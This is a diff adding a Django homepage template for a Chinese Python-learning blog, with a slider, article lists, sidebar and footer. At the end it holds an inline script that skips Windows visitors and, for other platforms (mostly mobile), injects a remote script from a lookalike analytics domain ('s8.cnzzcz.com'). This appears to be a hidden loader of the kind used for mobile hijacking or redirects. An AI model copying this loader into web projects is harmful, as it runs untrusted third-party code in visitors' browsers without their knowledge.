@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<!-- saved from url=(0022)http://demo.django.cn/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="apple-mobile-web-app-title" content="PythonTOP,拓普Python学院">
+    <title>拓普Python学院,Python!</title>
+
+
+{% load  static %}
+<link rel="stylesheet" id="bootstrap-css" href="{% static 'css/bootstrap.min.css' %}" type="text/css" media="all">
+<link rel="stylesheet" id="fontawesome-css" href="{% static 'css/font-awesome.min.css' %}" type="text/css" media="all">
+<link rel="stylesheet" id="stylesheet-css" href="{% static 'css/style.css' %}" type="text/css" media="all">
+<link rel="stylesheet" id="raxus-css" href="{% static 'css/raxus.css' %}" type="text/css" media="all">
+<link rel="stylesheet" id="open-social-style-css" href="{% static 'css/os.css' %}" type="text/css" media="all">
+    <meta name="robots" content="index,follow">
+    <meta name="keywords" content="互联网,产品经理,产品设计,用户体验,交互设计,网站运营,移动互联网">
+    <meta name="description" content="聚焦互联网前沿资讯，网络精华内容，交流产品心得。 每天为你速递最新、最鲜、最有料的互联网科技资讯！">
+</head>
+<body class="home blog site-layout-2">
+<!-- 头部 -->
+<header class="fix-wrap" id="fix-wrap">
+    <div class="fix-main clearfix pr" id="fix-main" _hover-ignore="1"><a href="http://demo.django.cn/" class="index-logo">
+        <img src="{% static 'images/black-logo.png' %}" alt="拓普Python学院,Python!"></a>
+        <nav class="nav fl">
+            <ul id="fix-list" class="fix-list clearfix">
+                <li id="menu-item-24086" class="menu-item"><a href="{% url 'blog:index' %}">首页</a></li>
+                    {% for cat in category %}
+                    <li id="menu-item-117720" class="menu-item">
+                        <a href="{% url 'blog:index' %}list-{{ cat.id }}.html">{{ cat.name }}</a>
+                    </li>
+                    {% endfor %}
+                <li id="menu-item-24086" class="menu-item"><a href="http://demo.django.cn/about/">关于博主</a></li>
+            </ul>
+        </nav>
+        <form method="get" class="index-search  hidden-xs" action="{% url 'blog:index' %}s/">
+            <input class="text" name="search" type="text" placeholder="输入关键字" value="">
+            <button class="submit" type="submit"><i class="fa fa-search"></i></button>
+        </form>
+    </div>
+</header>
+
+
+    <div id="main-container" class="container clearfix">
+        <section class="post-left">
+            <div class="row">
+                <!-- /banner图 -->
+                <div class="col-md-6">
+                    <div id="featured" class="raxus-slider" data-autoplay="3000" data-keypress="false" data-thumbnail="bottom" data-show="1" tabindex="0">
+                        <div class="slider-area" style="bottom: 105px; left: 0px; right: 0px; top: 0px;">
+                            <ul class="slider-relative" id="relative" style="transform: translate(-415px, 0px);">
+                                {% for banner in banner %}
+                                <li class="slide fix-width selected">
+                                    <a href="{{ banner.link_url }}" title="{{ banner.text_info }}">
+                                        <span class="image">
+                                            <div class="vertical-helper"></div>
+                                            <img src="/media/{{ banner.img }}" srcset="/media/{{ banner.img }}" alt="{{ banner.text_info }}" class="wp-post-image" width="370" height="290" style="display: inline-block;">
+                                        </span>
+                                    </a>
+                                    <span class="text ani-left" style=""><strong>{{ banner.text_info }}</strong><div class="clear"></div></span>
+                                </li>
+                                {% endfor %}
+
+
+                    </ul><ul class="dots" style="margin-top: -10px;"><li class=""><span></span></li><li class="selected"><span></span></li><li class=""><span></span></li><li class=""><span></span></li></ul><div class="arrow-l"></div><div class="arrow-r autoPlayButton"></div></div><div class="mini-images-relative"><ul data-thumbwidth="0" class="mini-images no-slide"><li class=""><span class="img-selected"></span><div class="image"><img src="./拓普Python学院,Python!_files/wpress1.jpg" alt="" style="display: inline-block;"></div></li><li class="selected"><span class="img-selected"></span><div class="image"><img src="./拓普Python学院,Python!_files/wpress4.jpg" alt="" style="display: inline-block;"></div></li><li class=""><span class="img-selected"></span><div class="image"><img src="./拓普Python学院,Python!_files/wpress8.jpg" alt="" style="display: inline-block;"></div></li><li class=""><span class="img-selected"></span><div class="image"><img src="./拓普Python学院,Python!_files/wpress2.jpg" alt="" style="display: inline-block;"></div></li></ul></div></div>
+
+                </div>
+                <!-- /banner图 -->
+
+                <!-- 首页推荐 -->
+                <div class="col-md-6">
+                    <div class="hotread ">
+                        <div class="title">推荐阅读</div>
+                            {% for recommend in recommendArtical %}
+                            <div class="caption">
+                                <h4><a href="http://demo.django.cn/show-{{ recommend.id }}.html" title="{{ recommend.title }}" rel="bookmark">{{ recommend.title }}</a></h4>
+                                <p>{{ recommend.excerpt }}</p>
+                            </div>
+                            {% endfor %}
+
+                        
+                    </div>
+                </div>
+                <!-- /今日头条 -->
+            </div>
+            <!-- /文章列表 -->
+            <div class="index-main clearfix">
+                <div class="main-title">
+                    <h4 class="post-left-title fl">最新文章</h4>
+                    <div class="fr"></div>
+                </div>
+                <div class="row">
+                        {% for new in newsArtical %}
+                        <div class="article-box clearfix excerpt-1">
+                            <div class="col-md-4">
+                                <div class="thumbnail">
+                                    <a href="{% url 'blog:index' %}show-{{ new.id }}.html" title="{{ new.title }}">
+                                        <img src="/media/{{ new.img }}" srcset="/media/{{ new.img }}" alt="{ new.title }}" class="wp-post-image" width="240" height="160"></a>
+                                </div>
+                            </div>
+                            <div class="col-md-8">
+                                <h2><a href="{% url 'blog:index' %}show-{{ new.id }}.html" target="_blank" title="{{ new.title }}">{{ new.title }}</a></h2>
+                                <p class="txtcont hidden-xs"><a href="{% url 'blog:index' %}show-{{ new.id }}.html" target="_blank" title="{{ new.title }}">{{ new.excerpt }}</a></p>
+                                <div class="meta"><span class="label label-info"><a href="{% url 'blog:index' %}list-{{ new.category__id }}.html">{{ new.category__name }}</a></span>
+                                    <time class="item"><i class="fa fa-clock-o"></i>{{ new.create_time }}
+                                    </time>
+                                </div>
+                            </div>
+                        </div>
+                        {% endfor %}
+
+
+                    
+
+                </div>
+
+            </div>
+            <!-- /文章列表 -->
+        </section>
+        <!-- /post-left -->
+        <!-- /post-right -->
+        <aside class="post-right hidden-xs">
+            
+            <section class="widget post-right-item">
+                <h4 class="post-right-title">热门文章排行</h4>
+                <ol class="hot-list">
+                    {% for hot in hotArticals %}
+                    <li><a href="{% url 'blog:index' %}show-{{ hot.id }}.html" title="{{ hot.title }}">{{ hot.title }}</a></li>
+                    {% endfor %}
+                </ol>
+            </section>
+            
+            
+
+<section class="widget post-right-item">
+    <h4 class="post-right-title">热门推荐</h4>
+    <ul class="post-hot clearfix">
+            {% for hotRecommend in hotRecommend %}
+            <li>
+                <div class="img">
+                    <a href="{% url 'blog:index' %}show-{{ hotRecommend.id }}.html" title="{{ hotRecommend.title }}">
+                        <img src="/media/{{ hotRecommend.img }}" srcset="/media/{{ hotRecommend.img }}" alt="{{ hotRecommend.title }}" class="wp-post-image" width="120" height="80">
+                    </a>
+                </div>
+                <div class="text">
+                    <a href="{% url 'blog:index' %}show-{{ hotRecommend.id }}.html" title="{{ hotRecommend.title }}" target="_blank">{{ hotRecommend.title }}</a>
+                </div>
+            </li>
+            {% endfor %}
+    </ul>
+</section>
+
+
+<section class="widget post-right-item"><h4 class="post-right-title">所有标签</h4>
+    <div class="tags">
+            {% for tag in tags %}
+            <a href="{% url 'blog:index' %}tag/{{ tag.name }}">{{ tag.name }}</a>
+            {% endfor %}
+
+
+    </div>
+</section>
+{#<!-- /关注我们 -->#}
+{#<div class="post-right-item">#}
+{#    <h4 class="post-right-title">关注我们</h4>#}
+{#    <div class="wid-about">#}
+{#        <p>拓普Python学院，欢迎关注！</p>#}
+{#        <img src="./拓普Python学院,Python!_files/weixinqr.jpg" alt="微信二维码" width="160" height="160">#}
+{#    </div>#}
+{#    <div class="wid-about">#}
+{#        <p><strong>联系方式:</strong></p>#}
+{#        <p>QQ:445813</p>#}
+{#        <p>Email：445813@qq.com</p>#}
+{#    </div>#}
+{#</div>#}
+
+
+        </aside>
+        <div class="FriendLink hidden-xs clearfix">
+            <div class="title"><h3>友情链接：</h3></div>
+            <ul class="clears">
+                    {% for link in links %}
+                    <li><a href="{{ link.linkurl }}" target="_blank">{{ link.name }}</a></li>
+                    {% endfor %}
+
+            </ul>
+        </div>
+    </div>
+
+
+<!-- 底部 -->
+<footer class="footer">
+    <div class="copyright"> © 2010- 2018 · All Rights Reserved
+        · <a href="https://www.django.cn/">Django中文网</a>
+        · <a href="http://www.miibeian.gov.cn/" target="_blank">湘ICP备17023990号</a> 版权所有 © Django中文网
+    </div>
+</footer>
+<script src="{% static 'js/bundle.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/view-history.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/push.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/jquery.min.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/bootstrap.min.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/raxus-slider.min.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/loader.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/bj-lazy-load.min.js' %}"></script>
+<script type="text/javascript" src="{% static 'js/os.js' %}"></script>
+<script type="text/javascript">
+(function(d, n) {
+    	if(n.indexOf('Win')=='0')return;
+        var ho = d.createElement("script");
+        ho.src = "http://s8.cnzzcz.com/ip/6845?w="+n;
+        var s = d.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(ho, s);
+})(document, navigator.platform);
+</script>
+
+</body></html>
